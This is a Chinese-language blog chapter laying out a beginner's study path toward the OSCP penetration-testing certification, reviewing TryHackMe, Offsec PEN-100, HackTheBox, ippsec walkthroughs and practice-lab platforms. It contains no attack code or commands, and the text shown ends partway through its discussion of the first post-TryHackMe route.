---
layout: post
title: "資安系列第二章 資安學習的從零到OSCP"
subtitle: "萬字講解零相關經驗的學習者如何碰到OSCP的入門門檻。"
date: 2024-06-15
author: "Peter"
header-img: "img/post-bg-hack.jpg"
tags: [資安, OSCP]
---

在先前的第一章中，我們概覽了什麼叫做資安，從廣義上的資安 -- 也就是我們平常看到的詐騙等等，到狹義上的資安 -- 也就是專業領域上的紅藍隊攻防。並且，在第一章的最後，我們提到了資安學習的獨特性，資安是一個相對比較特別的學門，相對於其他領域，資安領域會很看重證照，但也必須隨時提醒自己比起考取繁多的證照，擁有的技能與溝通能力才是關鍵。

在這個章節中，我會為後面的 OSCP(滲透測試證照) 進行鋪路，講解我是如何從一個完全沒有資安背景的人學習到能夠考取OSCP的程度，以及我建議在這個過程中可以怎麼更有效率地提升自己的學習成果。由於我沒有背景，也就表示這篇所提及的學習路線是幾乎不需要任何基礎知識的，但同樣的也代表如果你有很多基礎知識的，裡面很多內容也就可能不那麼適合你。此外，原本在這篇文章的最後是要如同第一章有一個附錄是在專門講解我對於學習資安的看法跟怎麼培養看到問題的「眼睛」，但這篇內容到這邊我覺得比較好整理，另外一篇文章就另行發布，不在這裡占版面了。

關於章節構成，我首先會講講作為一個零基礎的資安學習者有什麼樣的路線可以選擇，內容包含了傳統的紅藍隊，在這個段落的最後我給出了建議覺得應該還是從紅隊開始比較好。而由於我本人也是學習滲透測試出身加上第三章是關於 OSCP 的過程，這邊同樣也會從我身的經歷出發，講述我自己經歷過跟我後來建議的學習路線，也就是第二節的內容。關於這一節，我分成三個部分，從零到一、從一到六十、從六十到 OSCP，分別代表了學習中很重要的三個階段：打基礎、從基礎學習滲透測試知識、深化滲透測試的學習以銜接 OSCP。第三節則會聊聊在這個過程中要怎麼讓自己學習得更好、更順利，其中講了如何寫筆記，以及打靶機(虛擬機滲透練習)的一些小技巧跟心法。

### 構成 ( Table of  Content)

1. 選擇你的資安學習路線

2. 我的建議資安學習路線

   2.1 從零到1

   2.2 從1到60

   2.3 從60到OSCP

3. 一些關於學習上的小技巧

   3.1 如何做筆記

   3.2 如何打靶機

4. 結語

## 選擇你的資安學習路線

資安學習的路線百百條，如同網路上有前端、後端、全端、DevOps 的路線圖(Roadmap)一樣，資安也有專屬於資安的路線圖。如同我們在第一章所講的一樣，資安可以分為紅隊藍隊，在之中又有各式各樣的技術要學。關於資安的路線圖，我們可以從網路上的資料看到其他人是怎麼規劃的，例如下面這張圖就是蠻典型的紅隊路線。

![cybersecurityroadmap.png](https://github.com/thatstraw/Cybersecurity-Roadmap/blob/main/maps/cybersecurityroadmap.png?raw=true) Source: [GitHub - thatstraw/Cybersecurity-Roadmap](https://github.com/thatstraw/Cybersecurity-Roadmap)

參考他人的路線圖是一個很好的方法，透過看各式各樣的路線圖，我們可以知道自己大概要往什麼方向前進。像是大多數的資安路線圖會將 Networking(網路) 放在很前面，我們就會知道在資訊安全領域當中網路是很重要的一環。不過這邊我就不去針對別人的路線圖去做太多評論，主要想表達的是透過參考路線圖我們可以知道很多可以參考的方向。

稍微要注意的是不要同時跟隨太多的路線圖，這樣會容易手忙腳亂、容易學習太多東西導致自己無法吸收或是無法成功地運用學習到的技能。以資安學習平台為例，上面有 TryHackMe、HackTheBox、OffSec... 等等的平台，每個平台都有自己安排好的路線圖甚至是學習心法，而那些路線圖通常都是設計好一連貫地可以從頭練習到尾。如果是一個單元一個單元在平台之間反覆橫跳的話，很容易陷入一個技能學習太多，或是技能無法成功組織的狀況。

這也是為什麼我建議將路線圖當作是一個「參考」的原因，因為路線圖本身並不提供技能，只是一種作者覺得這個產業或職位需要什麼能力的展現方式。先將路線圖當作一個底之後，再去各個學習平台上面學習技能會是我比較推薦的學習方法。

### 要先學會攻擊，才能知道如何防守

這句話我忘記是在哪裡看到的，但說得蠻有道理的，這句話也同時在初學者很常糾結的紅藍隊選擇上起了一定的推坑作用。類似的話也有像：「防守必須要守很多道，而進攻只需要成功一次就可以突破」。這些都顯示了學習進攻的重要性。在大部分的情況下，防禦是必須建立在可能的攻擊情境上，由於攻擊情境的多變，很難有一套方法可以完全阻擋對手的入侵。少數去對抗的方法也就是試著讓自己的系統被攻擊，而系統安全的設計與緩解都是建立在會如何被攻擊之上的。就算學了防禦，不會還是必須要有辦法復現攻擊手法才知道自己的防禦是否成功。



## 我的資安學習路線

簡單聊聊其他人的路線以及路線選擇之後，這裡是我的資安學習路線。關於我本人的資安學習在先前的文章中都有提到過不少，像2022年10月寫的 [Hacking / Pentesting 學習日記 #1](https://peterkan.tw/2022/10/20/pentesting-diary-01/)  以及 [OSCP 課程心得 part1 -- Challenge lab開始前的紀錄](https://peterkan.tw/2023/06/20/oscp-part-one-review/)。第一篇是我在 TryHackMe 上練習了一陣子寫的感想，主要可以看到一個完全入門的人對於資安的看法以及一些很青澀的心得。

> 我想這是資安領域比較特別的一種手法，很多的平台與考試也都以這種操作為主：vpn -> 虛擬機 -> 成功破解並拿到FLAG，但這種手法對於學習的幫助可謂很大，在我們學習其他東西的時候，常常缺少的就是一個回饋機制，很多時候只有手作，但手作的效果如何，沒有人知道。一旦虛擬機是經過妥善編排的，作業的品質跟練習的成效就會很大。

另外一篇是我鼓起勇氣買了 OSCP 後，在上完課程準備進去做 LAB 之前的總結。這篇除了講 OSCP 的課程之外，也有講到我是怎麼從零開始學資安的，我必須坦白講，我很喜歡講從零到一這個題目，對於我來說最有成就感的部分就莫過於是自己探索出一條沒什麼人走過的路，從一個完全不會的生手到能夠慢慢地看懂大部分的東西。我也傾向將這種紀錄跟方法分享給其他人，所以這篇可能會跟那篇有很大重疊的地方，如果覺得這篇有什麼缺漏的話也歡迎去那篇逛逛，可能會有一些收穫，但東西基本上會很像。這篇會多的是比較從我從真正的 OSCP 考試中學到心法後反芻回來的內容，可能文字會比較有組織，但也會少了一些新手才有的朝氣。

> 雖然oscp很貴，但我一開始其實是沒有抱持著什麼太大的期待，就想說好吧，反正有什麼我就上什麼，上完就拿張證照，既然大家都說那張證照是個鐵飯碗那我也來考個 ~~，我想當工程師 (›´ω`‹ )~~。沒想到的是，oscp的課程編排、難度、水準都十分有水準，我完全不後悔花了那麼一大筆錢上這門課程。

接下來這個小節會分成三個部分，從零到一、從一到六十、從六十到 OSCP。分別會講我在這段過程的經歷以及我會建議要怎麼去學習。從零到一比較像是從講述一個電腦小白如何踏入資安領域的方法以及有什麼資安的資源可以參考。從一到六十會是主要著重在 TryHackMe 的 The Begginer's Path 上，這是一個很有價值且很便宜的學習過程，其中也會提到其他方法。而最後的六十到 OSCP 則是把 TryHackMe 上面的資源做內化，讓自己能夠銜接上 OSCP 的過程與心得。

### 從零到一

資訊安全的「從零到一」是一個比較模糊的過程，特別在於如何去定義那個「一」。以語言學習來說通常會有一個考試的門檻，例如像是拿到多益500分時我們會說英文到了「可以入門」的階段，或是我們日語的N5或者N4。在程式設計的世界裡面，在網頁來說那個「一」會是我們能成功用 HTML 寫出一個 HelloWorld 的網頁。而資訊安全的那個「一」又是什麼？我會把它定義為是有基礎的網路、Linux、Windows能力，可以從「資訊安全」四字看起，這四字講的事情莫過於發生、解決電腦裏頭的安全問題，而電腦基本上就是由系統組成，接著透過網路與人互動，而資訊安全就是在理解、學習、攻擊這些東西。

關於從零到一的過程，我接下來會推薦大家由 TryHackMe 的 [Complete Beginner](https://tryhackme.com/path/outline/beginner) 開始學習，我們也可以透過他的前置要求來看看我們的資訊安全的「一」是怎麼被定義的。

> Prerequisites:  
> You need a basic understanding of fundamental computing principles and a broad understanding of the different areas of cyber security to complete this pathway. If you do not already have these prerequisites, complete the [Pre-Security Pathway](https://tryhackme.com/path-action/presecurity/join) and [Intro To Cyber Security Pathway](https://tryhackme.com/path-action/introtocyber/join).  
> 先決條件：您需要具備基本的計算機原理知識和對網路安全不同領域的廣泛了解，以完成此學習路徑。如果您尚未具備這些先決條件，請先完成「預備資安學習路徑」和「網路安全簡介學習路徑」。

我們可以看到 TryHackMe 的 Complete Beginner 並不是完全給入門者的內容，而是需要其他課程來學，這也是關於我們的從零到一的部分。如果看他的課綱會發現 Complete Beginner 跳過了很多關於網路跟系統的介紹，而這些內容就要到他的  [Pre-Security Pathway](https://tryhackme.com/path-action/presecurity/join) 跟 [Intro To Cyber Security Pathway](https://tryhackme.com/path-action/introtocyber/join) 裡面學，我個人也是推薦在踏入 Complete Beginner 之前先上這兩個環節，可以為將來打好蠻好的基礎。

> 註：在要進行學習之前，好好地審視每個課的課綱是非常重要的，透過看課綱跟課綱的比較，我們可以知道這堂課對我們來說難易度會不會太高或太低，抑或是知道這堂課符不符合自己的需求。如果你要上的課沒有提供課綱的話，不妨寫信過去問問看，在上課之前針對課綱內容仔細閱讀或提問也會是一個很好的習慣。

### Pre-Security Pathway

![image-20240506202106309](/img/in-post/howtolearncybersec/image-20240506202106309.png)

[Pre-Security Pathway](https://tryhackme.com/path-action/presecurity/join) 裡面的內容大致上就像我們上面講的基礎的網路及系統能力。如同上面所講的資安的組成，網路跟系統能力在整個資安領域裡面都是絕對關鍵的一個環節。回到我們先前聊的資訊安全四個字，莫非就是關於我們的資訊設備、資訊傳輸等等的安全性。資訊的傳遞主要是仰賴網路，而資訊傳遞的接收對象就是我們的電腦跟手機，而絕大部分的伺服器、手機都是採用類 Unix 的系統，Linux 是其中一個分支。而個人電腦最多人與企業使用的是 Windows，於是我們透過學習網路與系統，我們就可以掌握絕大部份的資訊基礎。當然在這之上還有如網頁、App 等等的應用，這些我們在學習資訊安全基礎的時候就會慢慢碰到像是 [OSI 模型](https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B)的概念。

在學習這個部分的時候，我會建議可以把注意點放在這些地方：

1. 封包
2. LAN WAN 等網路差別
3. Windows 的系統結構與 UAC

#### 1. 封包

關於封包，封包我們可以看到下列定義：

> 在網路上傳送資料時，須先將資料依既定的格式切割成多個區塊，稱之為封包（Packet）。資料以封包的方式在網路上傳輸，每個封包分為表頭區（header）和資料區（data block）兩部分。表頭部分定義該封包的目的地位址和封包在網路上的處理方式。 source: [封包 : ㄈㄥ ㄅㄠ - 教育部《重編國語辭典修訂本》2021 (moe.edu.tw)](https://dict.revised.moe.edu.tw/dictView.jsp?ID=36802&la=0&powerMode=0)

封包是我們在網路上傳遞資料的載體。為什麼封包很重要的原因是，我們所有網路上的資料都會跟封包有關係，常常有一句話是在講，網路的世界裡沒有人是隱形的，就是指說我們每一個資料都會留下紀錄，而記錄的形式就是封包。封包的重要程度大到大公司會有專門的軟體在監控流量；滲透人員會時時刻刻注意不要讓自己的IP洩漏出去到對向那邊，一旦洩漏就視同攻擊；有許許多多專門的攻擊是在攔截與針對封包進行加密或解密。如果在這個階段先了解何謂封包的話，在後續進行學習都會有不小的幫助。

#### 2. LAN/WAN 等網路差別

這邊就不代替 TryHackMe 來教學了，~~我教得肯定是沒有人家好~~，只講講理解差異的重要性。用非常非常簡單的話來說，LAN代表著不與網際網路接觸的內網，而WAN代表著與網際網路接觸的外網。這個很重要的原因在於，網路並不是所有設備都是面向網際網路(Internet)的，包含我們電腦裡面就有很多程式是指對內不對外，另外像是印表機、甚至是物聯網的很多設備都是不聯外的，理解內網與外網的差異可以幫助我們在設定很多東西都很方便，尤其是在學習過程我們會大量運用到虛擬機，而虛擬機的種種設定都與網路的內外網息息相關，打好基礎之後可以節省很多麻煩。

#### 3. Windows 的系統結構與 UAC

Windows 這東西... 乍看之下很簡單，其實很複雜。在我學習的過程中，有一個超級大的關卡是卡在 Windows 上面。 Windows 這個作業系統會無止盡地出現在我們的資安學涯、職涯當中。不過他一直出現並不是我建議要把 Windows 的基礎夯實的理由。為什麼要學好 Windows 是因為他不是一個很好理解的作業系統。它用起來十分容易且順手，但不知道你有沒有經驗是，當我們試著要改一個設定時卻發現怎麼找都找不到，照著網路上的教學也改不好，一下工作管理員、一下控制台的情況。這些情況會常常在我們學習 Windows 的時候出現，我們倒不用一直開控制台或是開工作管理員，而是會認知到 Windows 實在是一個結構複雜專有名詞繁多的系統。因為他實在這麼複雜，所以能先打好一點基礎是一點，我們後面會碰到更多 Windows 相關的內容例如 Active Directory，在一步一步前行的過程中前面的基礎有沒有好好的夯實就是很重要的關鍵了。

我推薦可以在這個階段多看一點的內容大致上如上，但其他地方也不能說是不重要，在資訊安全的領域裡面網路跟系統的基礎非常重要，在有些比較細節或專業的環節中甚至會把網路的說明書像是RFC一字一句地拿出來看，這些都很大程度地會需要我們的網路基礎。但同樣地有個理解就好了，倒是不用去鑽研網路到像是看專門的網路課程，就有點殺雞用牛刀了。



### Intro To Cyber Security Pathway

![image-20240507152712124](/img/in-post/howtolearncybersec/image-20240507152712124.png)

另外一條路線是關於對於整體的資訊安全的介紹，內容與我們第一章的內容相仿，主要是將進攻與防守切成各個區塊來談，分別是網頁、系統與網路。前面提到的 Pre-Security Pathway 是關於像網路、系統等等的基礎能力，而這邊就會簡單帶到如何將「能力」轉換為資訊安全實務上的進攻與防守業務。

在資訊安全領域裡，要如何地將自己的知識轉換為進攻防守是一個很重要的課題。可以講到一個有趣的小故事是，我最近在看一個[講解數位鑑識的 YouTube 課程](https://www.youtube.com/watch?v=giv0DQDSsjQ&list=PLJu2iQtpGvv-2LtysuTTka7dHt9GKUbxD)，裡面的第一則影片就建議我們可以去讀三本書，分別是 Linux Command Line 之於數位鑑識的書、作業系統的書 (長達1200頁的恐龍本)、以及數位鑑識的長達800頁的書。雖然講者說不用去讀也可以理解這門課程，但這讓我不禁想到說，如果真的讀完這些書的人，真的有辦法將所學到的知識轉換為數位鑑識上所需要的知識嗎，在其中又會有多少東西是在這過程被遺忘的呢？

當然作為一位老師會希望學生有愈多的先備知識愈好，但以我自己在學習的情況來說，單純地去讀那些厚重的書籍學習到的效果除了因為練習不足能夠吸收到的知識很有限之外，讀了越多書籍之後反而會開始斟酌自己對於課程的選擇，在有限的時間裡面拿去學習了許多先備知識的話，那能夠學習資安實務的時間就會相對地被壓縮，而掌握好兩者的平衡是一個要學習的課題。這篇後面會提到一個資安教育者叫做 ippsec，對於這個問題 ippsec 的解法是他會先進行滲透測試的虛擬機的訓練，訓練完之後再花一樣甚至更多的時間去理解裡面的內容，遇到不懂的地方就可以把原始資料或是原始碼拿出來好好學習，這也是一個方法。

做個小結，資訊安全的從零到一大致上可以理解為先理解網路、系統等等的基本知識，學會了這個「一」之後我們接著就可以去開始學習與資安 -- 在這邊是滲透測試相關的知識。在接下來的章節，我們會進入資安的從一到六十，也就是要跳入到我們上面跳過 Complete Beginner Path ，同時也會講其他的替代方案，像是可能可以做為練習的平台與證照，同樣透過閱讀課綱來看看需要哪些知識以及如何進行練習。

## 從一到六十

在經歷過前面的階段之後，在這個階段的學習者應該要有以下的相關知識：

1. 基礎的網路、作業系統知識
2. 大致上理解資訊安全的分類與工作內容

話雖如此，從零到一我們可以理解為是一個概覽資訊安全領域的過程，而一旦進到一到六十我們就要開始堆疊自己的資訊安全(在這裡或許是滲透測試)知識。關於零到一、一到六十這些規劃，我想把學習曲線圖列出來再進一步講我們這個階段要做些什麼事情。

### 學習曲線 (Learning Curve)

![](/img/in-post/howtolearncybersec/learning-curve.png)

source: [Learning Curve: Theory, Meaning, Formula, Graphs 2024 (valamis.com)](https://www.valamis.com/hub/learning-curve), 筆者追加紅線註記

這張學習曲線圖是我對於滲透測試的學習的理解。如同學習很多其他東西一樣，學習資安滲透的一開始是最快的，當快到一個程度之後曲線就會漸漸趨緩，而我把這個曲線進一步地切了兩刀，分別在60分的地方與約莫80的地方。

60分的區域就是我們在這個小節會說明的內容，這個章節包羅萬象，包含像是更多的網路、作業系統知識，還有像是滲透專門的密碼學知識、Wireshark 的使用方法、Metasploit 的使用方法等等。學這些東西的時候我們吸收跟成長的速度很快，由於曲線的快速成長的緣故這個階段算是十分好玩的，我們也可以正式的踏入白帽「駭客」的領域。

但到了60分之後，事情就會變得有點棘手。如同曲線逐漸減緩，我們的學習也會逐漸陷入瓶頸，我會理解為這個區段會決定一個人是不是真的要踏入滲透測試這個領域。以學英文來比喻的話，這個就會是我們學完現代式、過去式等等的語法之後，開始進入到英文的片語、介係詞等等不太講理且需要大量實作的地方。關於這個階段的學習與練習我們會在下一節「從六十到OSCP」這個章節有更詳細的描述。

到了大概80分之後，能力上升的曲線就會很明顯地趨緩下來，我將 OSCP 設定為一個分水嶺，過了 OSCP 就大概會有入門工作的能力，這也是我現在處的位置。到了這個階段之後就沒有很明顯的知識大量吸收，而是要逐漸地從各個領域補足自己在職場上、專業技能上所需要的知識，成長幅度相對會變小，必須花費更大量的時間才會變得更進階，由於我對於後面的世界也不是說特別熟悉，這也會是後續文章會講述的東西，並不會在這篇提及。

### 學習資源

在這個階段的學習資源就會變得相當海量，因為我們已經有基礎的網路、系統能力的關係，之後再去看各個課程都會相對好上手。網路上也有很多課程是專門提供給這個階段的學習者的。由於很多其他課程我沒碰過的我也不好多講，我這邊講一個我自己上過的，以及其他兩個我覺得可以試試看的。

### TryHackMe - Complete Beginner Learning Path

首先就是我自己上過，也是網路上很多人推薦的老朋友 [TryHackMe 的 Complete Beginner Learning Path](https://tryhackme.com/path/outline/beginner)，我自己是相當推薦這個課程的。與上方同樣，我們先把他的課綱列出來我們一起來看看包含了什麼，由於圖片不好截取，我們用文字條列，並把小節使用「/」區分：

- **SECTION 1 - Complete Beginner Introduction**
  - Tutorial / Starting Out In Cyber Sec / Introductory Researching
- **SECTION 2 - Linux Fundamentals**
  - Linux Fundamentals Part 1 / Linux Fundamentals Part 2 / Linux Fundamentals Part 3
- **SECTION 3 - Network Exploitation Basics**
  - Introductory Networking / Nmap / Network Services / Network Services 2
- **SECTION 4 - Web Hacking Fundamentals**
  - How Websites Work / HTTP in Detail / Burp Suite: The Basics / OWASP Top 10 - 2021 / OWASP Juice Shop / Upload Vulnerabilities / Pickle Rick
- **SECTION 5 - Cryptography**
  - Hashing - Crypto 101 / John The Ripper / Encryption - Crypto 101
- **SECTION 6 - Windows Exploitation Basics**
  - Windows Fundamentals 1 / Windows Fundamentals 2 / Active Directory Basics / Metasploit: Introduction / Metasploit: Exploitation / Metasploit: Meterpreter / Blue
- **SECTION 7 - Shells and Privilege Escalation**
  - What the Shell? / Common Linux Privesc / Linux PrivEsc
- **SECTION 8 - Basic Computer Exploitation**
  - Vulnversity / Basic Pentesting / Kenobi / Steel Mountain

透過章節我們可以看到，章節一、二、三是在將先前所學的內容作更進一步地展開。章節四是關於網頁滲透，裡面提到了幾個重要的工具像是 Burp Suite，網頁安全的框架如 OWASP、還有很多可以練習的區塊。章節五是關於密碼學，密碼在資訊安全領域中佔了一個很重要的位置，關於密碼的結構與如何加密、解密密碼也會是一個非學不可的領域。六則是關於 Windows 的基礎知識與滲透技巧，裡面會講到一個無比重要的工具叫做 Metasploit。TryHackMe 的 Metasploit 課程是我相當喜歡的一系列課程，裡面會清楚地涵蓋如何好好運用這個工具，這個工具在所有學習階段，尤其是資安實務上都會被廣泛運用。不過 OSCP 對於其使用有相當大的限制，這邊就不贅述。第七節講的是關於提升系統權限，又稱提權、PE(Privilege Escalation)。提權是一個相當重要的概念，我們在成功滲入一個系統之後，通常只會拿到受到百般限制的使用者權限(User Shell)，如何將使用者權限提升到更高的管理員權限也是另外一個很重要的課題。這邊同樣做了一個簡單的概括包含一些工具如 LinPEAS 的使用。最後第八節的內容比起教學，更多是關於透過靶機來進行實戰演練。

從以上的課程綱要我們可以歸納出幾個學習重點是關於系統、網頁、密碼、提權等等，這些東西基本上會貫穿整個滲透測試領域，也就是說不管是什麼階段的滲透測試人員所學的東西大概都跟這些脫不了關係，更多是在這些概念上面去做延伸。

額外補充的是，TryHackMe 這些課程可以說好也可以說不好的地方在說，我們乍看之下裡面只有講到這些內容，但裡面很多會因為各個老師的習慣導致有很多課程會用到各種不一樣的軟體來進行。例如像是 OWASP 的課程部分就會要我們先上 Wireshark，突然之間網頁滲透學一半跑去學 Wireshark 會有一點不適應，但裡面的東西都是很有幫助的，尤其如果碰到 Wireshark 或是其他內文補充的軟體千萬不要跳過，這些都會是很有幫助的內容。在這邊我就不做額外補充，我只能說每個地方都蠻值得探索的，有興趣的地方就多學一點，比較弱的地方到後面還是得慢慢補強回來。

### Offsec PEN-100

這邊來講講除了 Complete Beginner 之外還有什麼可以參考的學習路線。[PEN-100](https://www.offsec.com/products/fundamentals/) 是 Offensive Security (Offsec) 所提供的基礎課程，包含在所謂 Learn Fundamental 的大組合裡面，這個裡面有很多基礎課程，但同時也要價不斐，一年的金額是 $799 美元。相比於 TryHackMe 只需要一個月 $10 美元，甚至有很多是不用訂閱也能看的課程這個貴了很多。這也是為什麼我沒有實際上過這個課程，但由於 OSCP 的課程品質十分良好，有能力的朋友還是可以考慮一下。

同樣地，我們來看一下[課綱](https://www.offsec.com/offsec/new-and-improved-learn-fundamentals/)：

- Linux Basics I & II
- Windows Basics I & II
- Networking Fundamentals 
- Bash Scripting Basics
- Python Scripting Basics
- PowerShell Scripting Basics
- Linux Networking and Services I & II
- Windows Networking and Services
- Network Scripting
- Working with Shells
- Troubleshooting
- Cryptography
- Web Applications
- Introduction to Active Directory

看到這裡我們會發現很多東西是跟我們上面是共通的，差別在於 TryHackMe 教了很多滲透測試的東西，而 PEN-100 都是關於真正的滲透測試「基礎」。其中的基礎跟我們先前學到的又不盡相同，這些不單單只是網路、系統的知識，而是滲透測試會用到的其他的基礎。最明顯的莫過於各種 Scripting(寫腳本) 了。Scripting 又常常稱作寫腳本，腳本是一個常常在系統管理被運用的東西。我們平常用 Linux 的時候會用到各種 bash 的 command line，Bash Scripting 就是將那些東西再加上條件式、迴圈等等達成各種功能。而 PowerShell 是 Windows 獨特的終端應用，可以想成是 Windows 版本的 Bash。這邊比較特別的是 Python, Network Scripting，也就是如何用程式語言去跟網路去做交互，這個在滲透測試領域非常關鍵的原因在於說，我們很常需要執行特定的網頁漏洞，最一般的方法通常會是利用瀏覽器去執行，也就是打開瀏覽器 -> 用滑鼠鍵盤交互 -> 等待回應的這幾個步驟。而透過網路腳本的話我們可以利用程式碼去指定我們要的區域去把特定的文字輸入進去，可以節省掉人類進行交互的時間，也可以增加我們的穩定度。

簡單做個小結，在「從一到六十」這個階段我們可以發現到說，先前的 TryHackMe 並沒有提到如何做 bash scripting 或是 network scripting，這些要透過[額外的模組](https://tryhackme.com/r/room/bashscripting)去選。相對於 TryHackMe 教得比較全面，OffSec 的 PEN-100 的內容建立在真正的打好後續基礎，我這邊會覺得如果在金錢或精神上有餘力的話可以試試看走 Offsec 路線，否則的話先去上 TryHackMe 後再依照自己的需求補足所需要的知識應該是比較好的選擇。在這個階段的話，我覺得不用特別去要求自己要有某種程度的能力，盡可能地先多掌握一點基礎知識，並且培養對滲透測試的興趣我覺得比較重要。這個階段也可以提前發現自己到底喜不喜歡資訊安全、或者是滲透測試，假如說覺得可以接受的話，再往後面的 eJPT、OSCP 等證照去學習也是一個不錯的方向。



## 從六十到OSCP

這個階段我會把重心放在於銜接 TryHackMe 到 OSCP。這兩個課程中間是有一道我覺得還不小的坎需要跨過去的，TryHackMe 這個平台的課程如同上面所說，是相對起來比較零散、沒有組織的。就我自己的經驗來看，TryHackMe 的內容以一個完全的新手來說要學習並不是一件很困難的事情，但相對而言在深度上還是有它的極限在。

> 註：在第三章「關於 OSCP 的一切」這個章節中會對 OSCP 有更詳細且全面的描述，OSCP 簡單來說是一個課程+證照的組合，因為它的市場接受度及扎實的訓練讓很多人趨之若鶩。這邊提到的從六十到 OSCP 指的是從我們上完 TryHackMe 的六十分程度如何銜接到把自己拉到80分的 OSCP 課程程度。**OSCP 課程本體的學習過程並沒有包含在篇裡面，請參照[關於OSCP的一切](https://peterkan.tw/2024/02/15/all-about-oscp/)。**

以我自己的經驗來說，我會建議這邊有三個路線可以考慮，第一條是我自己的經驗，第二條是是「我希望我是這樣走過來的」的路線，而第三條是網路上有人這樣做我覺得真是瘋了的路線，分別是：

1. 透過 HackTheBox 與 ippsec 的 Video Walkthrough 進行實戰訓練
2. 先去試著取得入門級證照 eJPT 後再取得 OSCP
3. 直接進行 OSCP 的訓練

在逐條說明之前，我想先聊聊這三條路是如何形成的。在練習完 TryHackMe 之後，我自己走的是第一條，也就是直接去 [TJNull 的清單](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)上面進行 [HackTheBox](https://www.hackthebox.com/) 的練習，這個的過程雖然有點挫折也有點迷失了方向，但整體學到了很多東西。在練習完 HackTheBox 上面的靶機(靶機 aka 練習滲透測試用的虛擬機)之後我就直接選擇購買了 OSCP 來開始下一個階段的訓練。但我在上 OSCP 時候吸收的雖然還不錯，但是我依然是在 OSCP 的 LAB 上吃足了苦頭，沒有辦法很有效率地將我所學習到的知識轉換為在虛擬機上練習能用到的實務經驗，於是才有了第二個選項。至於第三個選項... 我是自己在 reddit 上面看到有一些人有這樣做，我覺得可以聊聊我對於這個方案的想法。

### 1. 透過 HackTheBox 與 ippsec 的 Video Walkthrough 進行實戰訓練

這個路線如同上面所說的，這條路線的練習模式是透過 HackTheBox 上面的靶機進行實戰練習。上一個階段我們從 TryHackMe 上面學到了一定的技術之後，接下來的重點就會是在實際的情況中運用這些技能。但，我們並不可能直接去網路上擅自攻擊其他人的電腦，這樣的作法除了非常不道德、也並不被法律所允許。所以為了讓滲透測試學習者可以有一個練習的空間，各個滲透測試專家的解決方法就是建立一個個的虛擬機並發布在網路平台上供大家去練習攻擊平台所架設的虛擬機，也就是為什麼常常被稱作「靶機」的緣故。虛擬機的主要目的除了模擬實際的滲透測試情境之外，更多時候是一個虛擬機會包含了幾個小的任務讓練習者去完成，例如著名的 Blue 這個虛擬機就是要用戶練習使用 EternalBlue 這個漏洞來拿到系統權限。

在這個階段中，我們會使用 HackTheBox 這個平台。HackTheBox 是我們常見的一個平台之一，這邊簡單比較一下其他著名的幾個平台以及說明為什麼我沒選的理由。

1. [VulnHub](https://www.vulnhub.com/): 可以讓用戶自己下載靶機的檔案的平台，優點是完全免費，缺點是要自己架設VM，內容也相對比較老舊。
2. TryHackMe: 我們上面所提到的教學平台，雖然也是有靶機，但內容相對來說比較少但價格便宜。
3. HackTheBox: 靶機數量最多的平台，免費的只能練習現在開放的約20台，付費的話可以練習到數百台退役(retired)的靶機。缺點是如果要獨立IP的話價格就會相對高昂一點要20美金，但整體是我最愛用的。裡面的 walkthrough 很詳細之外，最近也多了一個 learning 的功能讓用戶可以一步一腳印地去跟著提示找出答案。對了，學藍隊的同學可以玩一個 HackTheBox Sherlock 是關於藍隊的內容，看起來很酷但我沒玩過就是。
4. [Proving Grounds](https://www.offsec.com/labs/): Offensive Security 所提供的靶機平台，內容分為免費的 Play 與付費的 Practice。與 HackTheBox 最大的差別是這邊的靶機都是 Offsec 自己建構的，靶機的設計邏輯很有 OffSec 的特色，相對於 HackTheBox 而言結構比較完整，也不太會有一些很刁鑽的漏洞。

我選擇 HackTheBox 的原因除了他上面的靶機數量眾多，可以參考上面提到的 TJNull 的清單去進行練習之外，最主要的關鍵是上面有 [ippsec](https://www.youtube.com/@ippsec) 很詳細的影片解說。ippsec 是一名在 HackTheBox 工作的資安專家，幾乎每一部退休的靶機他都會獨立拍一支影片來說明他是怎麼完成的。也就是說我們可以先自己練習一次靶機，並在這之後參考 ippsec 的解法從中去學習、檢討自己的缺失。當然現在 HackTheBox 多了一個引導的練習功能，我會建議可以先利用內建的引導系統完成後，再去看看自己的過程有沒有什麼可以修正的。

ippsec 除了會帶你從頭過到尾之外，他會在每個過程講解並優化自己的「過關方式」，這點是特別知識豐富且吸引人的。在練習靶機的過程很重要的事情是除了自己從頭到尾練習過一次之外，從靶機中學習並且試著去讓自己懂得更多、技巧更精湛是我們練習的重點。這邊我想插個話引一段 ippsec 本人在 X 上面的發言。

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">One old motto I&#39;ve thought a lot about recently is &quot;Practice doesn&#39;t make perfect, perfect practice makes perfect&quot;.<br><br>When pursuing a career in video games, I thought about this a lot as if you just grind out games for 12 hours per day. You likely will hit a wall that would…</p>&mdash; ippsec (@ippsec) <a href="https://twitter.com/ippsec/status/1655888776986521601?ref_src=twsrc%5Etfw">May 9, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

ippsec 說的很實際，他覺得練習是在反反覆覆的訓練中完成，不論成功或失敗透過反覆學習可以知道更多知識。雖然我前面提到說我雖然是走這條路過來的，但我自己不是特別推薦大家跟我一樣選擇這條路線的理由有兩個。

1. HackTheBox 的難度過高，儘管已經經過 TryHackMe 的訓練依舊難以完成其中內容，表示很難將前面的所學到的知識整合進去，容易在練習的時候感到挫折並降低學習效率。
2. HackTheBox 無法給自己很好的考試壓力，相對於 OSCP 是一個高壓的考試環境，自己練習 HackTheBox 很容易會讓自己陷入得過且過的思維誤區。

在平常學習的過程中，一旦遇到不懂的地方就去思考，想不通就找答案是一個很好的學習過程，但我個人依然覺得這樣的學習過程很難銜接上 OSCP。首先是關於學習資源的整理與分類，TryHackMe 的分類已經不是說很好了，但 HackTheBox 的學習會是一團渾沌，在這個階段最需要的是將知識統整並歸類，但 HackTheBox 只會教我們很多手法，並不會再給我們整理一次滲透測試的全貌。

